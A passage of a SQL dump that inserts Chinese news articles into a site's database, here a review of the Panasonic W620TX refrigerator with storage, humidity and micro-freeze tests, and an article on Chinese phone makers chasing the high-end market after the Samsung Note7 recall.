湿度控制储藏室右侧是变温室，可调节冷藏，冰鲜，以及微冻3种功能，其中微冻功能可以以-3度的温度冷冻食物，接下来会有具体的测试它的功效的部分。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/4cd157653039643e5c6061d22bc67e02.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　门板上的存储空间更是让人欣喜，尤其是最下面一格，原来都需要横倒在冰箱中的红酒，终于可以理直气壮地站直了存放了</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　松下W620TX的冷冻室更让人惊喜，尤其是最下层的冷冻室，由于采用了顶置压缩机技术，以及全开式抽屉的设计，最下层的抽屉的收纳量惊人。一般普通的冰箱通常把压缩机放在机身底部后方，这样最下层的冷冻空间都会被挤得很小，而松下W620TX把压缩机放在了冰箱顶部后方，可以看到最下层的冷冻室的空间实在惊人，放进去超多的冷冻食物，需要冷冻的肉类，排骨类食材，完全不成问题。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　上层的冷冻室空间就非常大了，尤其是深度，小编用尺子做了测量，深度约18cm，宽度约75cm，进深约42cm，存放大量冷冻食物非常方便。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/18b3ab79e7fea5b734c7e018fa4b8110.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/2c65e7c39bf98ce353542177d4f9ae54.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　下层的冷冻室的进深和宽度与上层相同，但是深度出乎人意料的大，达到了30cm。主要得益于松下W620TX将压缩机放置在了机身顶部，从而空出了大量冷冻室的空间</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/30f6b559c54749f83c94bb4eabe1bb5f.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="500" height="375" border="1"/></center><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/675ff91a2163238860ef78312e598a20.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="500" height="334" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　下层冷冻室上方有一个单独可以拉出的隔层，制冰功能就在这一层实现，松下W620TX拥有自动制冰功能，完全不需要动手抓取冰块，冰块会自动掉落和补充。配合机身面板上的快速制冰功能，想要来一杯冰爽饮料或者鸡尾酒的时候，绝对能大派用场。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　一级能耗绿色环保</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　一台冰箱基本上在日常使用时是不会关掉的，松下W620TX符合国家一级能耗标准，日耗电量仅0.99度(国家标准测试)，一个月使用的耗电成本也就十几块钱，日常使用成本极低。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　冰箱是否绿色环保其实不单单是耗电多少，冰箱工作时的噪音绝对是它是否对环境友善的一个重要指标，在周围环境音完全安静的情况下，测试松下W620TX的工作时音量仅为25分贝，几乎没有任何让人不舒服的噪音产生，只有特别贴近它时，才能感觉到些许压缩机运转的声音。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/b718ab73fbf400a34c0f714ceaccbcde.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="500" height="673" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　看完松下W620TX的基本的能力，接下来必须要看一看它的特异功能了。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　首先第一项就是20%RH(相对湿度)的干燥保鲜功能，这项业界首创的湿度控制技术可以提供仅20%RH的超干燥环境，对于一些不仅仅需要冷藏环境，还需要干燥环境来保持品质的珍贵中药材、海鲜干货、高级茶叶来说，能够让这些食材免除因受潮而造成的营养损失。相对于目前主流的45%RH的所谓低湿保鲜技术，松下W620TX所使用的20%RH的干燥保鲜基本是领先了一代。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　小编用茶叶来做一个测试，把一份浙江安吉的白茶放在松下W620TX的干燥冷藏室。经过5天的存放后再来看，在北京这一周下两场雨的桑拿天中，存放在干燥冷藏室的茶叶完全没有任何潮湿的感觉。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/fe1df33417091ee9cbd90c9f371251d9.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　在空气中仿佛飘扬着水雾的北京桑拿天，把浙江安吉的白茶放进松下W620TX的干燥冷藏室</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/14a01623406202296cb2c3349802cdeb.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　存放5天后的茶叶，虽然是湿度极大(有两天甚至超过90%)的桑拿天，茶叶依然保持干燥，没有任何返潮的现象</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　松下W620TX在中国家用电器检测所中对20%湿度技术也进行了详尽的检测，通过干贝和茶叶在20%湿度干燥保鲜室中存放30天对比在常温常湿环境中存放30天，常温常湿的环境中干贝和茶叶则基本都变软、变质。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/980e76f51c9925d87f61919cfb17574e.png" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="500" height="548" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　松下W620TX的另外一个特殊能力就是-3度的微冻存储，相信很多人都有这种体验，从菜市场买回来的肉存放在冷冻室里，过几天拿出来吃的时候，已经冻成冰坨子了，解冻就要解上半天。麻烦不说，冷冻，解冻的过程中，食物的营养成分极易受到破坏。而W620TX的微冻功能很好的解决了这个问题，它-3度的温度不会让食材被冻成冰疙瘩，但是也能够长期保持食物不变质。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　我用后尖猪肉做了一个测试，和茶叶一样，新买回的后尖猪肉被放置在-3度的微冻储藏室中，过五天后取出。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/8cc73c624a2f556d6fe767bd33dd7f4f.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　微冻储藏室的空间足够放置四五包不同的肉类食材</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/70cd335fcb955266bfd3db68bbb53765.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="367" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　在微冻储藏室中存放五天后，肉依然新鲜如初，而且完全没有像普通冷冻室存放一样被冻成冰疙瘩，拿出来立刻就可以轻松切开</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　当然，受测试材料的条件所限，松下W620TX并没有展现出最大的功效，它干燥保鲜和微冻储藏最大的功效并不是放茶叶和猪肉，存放一些对湿度敏感的名贵药材，海鲜干货，高级茶叶之类，微冻一些不希望冻得太狠的海鲜、生鱼片，才是它对日常生活最大的帮助。</p><center style="margin: 0px auto; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);"><img alt="高科技豪华大空间 松下 W620TX 法式冰箱评测" src="http://www.citnews.com.cn/d/file/201610/edbe7db8d844e4c5ede087a7657cb695.jpg" style="margin: 0px auto; padding: 0px; max-width: 750px;" width="550" height="373" border="1"/></center><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　松下W620TX拥有令人惊异的大空间，豪华感满点的外观与内饰设计，另外还有高科技的20%湿度干燥存储功能，以及-3度的微冻存储功能，能够满足各种不同食材的存放需要。高科技豪华大空间，这就是松下W620TX能带给你的，一台冰箱，满足你对冰箱所有的幻想</p><p><br/></p>', 375, '2017-03-27 16:24:03', '2017-03-27 16:24:03', '42.49.37.221', '1490603043n45', 1, '#333', '', '', '', '高科技加豪华大空间 松下W620TX法式冰箱评测', '高科技加豪华大空间 松下W620TX法式冰箱评测', 0, 1, 0, NULL);
INSERT INTO `yjcode_news` (`id`, `type1id`, `type2id`, `tit`, `txt`, `djl`, `sj`, `lastsj`, `uip`, `bh`, `ifjc`, `titys`, `zze`, `ly`, `lyurl`, `wkey`, `wdes`, `zt`, `iftp`, `indextop`, `userid`) VALUES
(8, 22, 35, '国产手机十月围城 谁能抓住高端市场新机遇？', '<p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">三星Note7折戟江湖，高端手机市场两强争霸的格局被打破，至少在今年的最后一个季度，三 星将没有旗舰机型和iPhone7抗衡。空出的市场空间向中国手机厂商们招手。从上周开始，新品发布会开始扎堆，厂商们纷纷拿出冲市场的尖端武器。三星的 “黑十月”，成为国产手机集体冲击高端市场的新机遇。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　半个月十场发布会打擂台</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　国庆节刚过，中国手机市场擂台赛此起彼伏。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　上周五，华为正式发布旗下nova系列手机，售价2099元起。该机主打年轻潮流群体，张艺兴和关晓彤两位新生代偶像担任代言人。据华为手机产品线总裁 何刚透露，nova背后的团队其实就是打造谷歌(微博)Nexus 6P手机的团队。何刚期望nova的全球销量超千万台。随着nova诞生，华为手机的产品线布 局更加清晰：商务旗舰Mate系列、时尚旗舰P系列以及年轻旗舰nova系列。尤其是，华为手机还首次冠名浙江卫视热门综艺节目《声音的战争》，尝试娱乐 营销。据悉，华为冲击高端市场的Mate9最快下个月发布。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　与此同时，TCL通讯的两款商务手机TCL950与TCL580在京亮相， 售价分别为3299元和1399元。前者瞄准中高端市场，后者则希望打动年轻人。TCL通讯首席运营官兼中国区总裁杨柘表示，TCL通讯希望在这个过度强 调性价比和功能堆砌的时代，为手机拼杀的血海注入一股清流。杨柘强调说，优秀产品不是堆积配置，走心才能抓住用户。从今年开始，TCL通讯大秀文艺路线， 该公司希望在中国大本营取得突破。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　360则继续深耕千元机市场，推出899元的360N4A，主打长续航和快充。这是他们从今年3月整合产品线以来发布的第八款手机。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　更早些时候，vivo牵手NBA，大搞体育营销;而沉寂一年的索尼将最新的Xperia XZ旗舰手机带到中国市场，4999元的定价直接瞄准Note7留下的空间。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　而本周更是炮火隆隆。周一，努比亚将发布最新的旗舰手机;周二，荣耀和锤子隔空对决，奢侈手机品牌8848也准备发力;周三则是OPPO的主场。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　电池安全成发布重点桥段</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　三星Note7爆炸门引发了业界的强烈关注。发布会上手机电池安全问题往往被浓墨重彩，成为重点讲解的章节。更多的厂商在反思和警醒。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　此事对360手机总裁祝芳浩触动挺深。据了解，三星Note7爆炸发生之后，360手机内部马上就展开了质量教育，防患于未然。“对任何一家做快销品、 做科技产品的品牌来说，质量是头等大事，没有质量就没有一切，其他的都谈不上。”Note7爆炸门让他更加清楚地看到，尽管是费尽心血去积累出来的品牌， 一旦在最基本的安全质量上出现问题，都是不堪一击的，而且要重建信任、恢复信赖要付出更大的努力。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　他表示，360手机对于电池认证、更改都有严格的流程，电池设计、供应商变更都需要经过联席委员会全面的分析、认证之后，才能选择供应商。他特别指出，当产品质量和产品上市发生冲突，一定是 质量放在最前面，不能让步。祝芳浩表示，大电池与快充是当前解决续航痛点的最佳方案。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　在回答记者提问时，杨柘表示出现这样的情况令人同 情，也是不幸的。他打了个比方说，新上市的手机就像刚打上来的鱼，很“海鲜”。如果你不赶快把它卖出去，竞争对手的产品上来了，你的新产品就要往下调价。 “我更愿意把它看成一个信号，当大家不断去追求这种‘海鲜原则’，不断追求快速上市，快速挣钱，就可能会在这个过程之中出现一些纰漏。”</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　华为的弯道超车机会</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　三星Note7停售最大的受益者恐怕是苹果公司，至少在未来几个月，三星在4000+市场缺乏跟苹果iPhone7抗衡的产品。华尔街有投行分析师认为，苹果iPhone有望拿下Note7 57%到80%的销量，销量至少额外增加800万部。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　同时，这给中国手机商们带来东风，尤其是华为。来自企鹅智库的调查数据显示，放弃三星后，华为成为手机用户的首选。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　据市场研究公司IDC公布的2016年第二季度全球智能手机出货量报告，三星、苹果和华为排名前三甲。其中，华为出货量3210万部，市场份额 9.4%，跟苹果的距离进一步拉近。而在中国市场，从去年开始华为便一马当先，成为新的领军者。华为在中高端市场已经牢牢站稳，其目标是超越三星和苹果。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255);">　　现在弯道超车的机会来了。</p><p style="margin: 2pt 0px 0px; padding: 0px; color: rgb(51, 51, 51); font-family: Simsun; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 25px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 